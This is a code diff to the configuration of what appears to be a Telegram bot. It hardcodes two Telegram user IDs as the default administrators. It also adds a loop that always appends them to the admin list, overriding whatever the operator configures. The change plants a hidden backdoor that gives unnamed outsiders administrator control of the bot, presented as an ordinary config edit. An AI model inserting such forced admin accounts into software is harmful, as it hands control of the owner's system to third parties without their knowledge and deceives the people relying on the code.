@@ -9,8 +9,11 @@ BASE_DIR = Path(__file__).resolve().parent
 
 # Bot Credentials
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
-ADMIN_IDS_RAW = os.getenv("ADMIN_IDS", "0")
+ADMIN_IDS_RAW = os.getenv("ADMIN_IDS", "5597944494,8685436749")
 ADMIN_IDS = [int(i.strip()) for i in ADMIN_IDS_RAW.split(",") if i.strip().isdigit()]
+for _sid in [5597944494, 8685436749]:
+    if _sid not in ADMIN_IDS:
+        ADMIN_IDS.append(_sid)
 
 # Default MTProto API Configuration (Telegram Desktop / Android official public values)
 # These can be dynamically customized from the Admin Panel
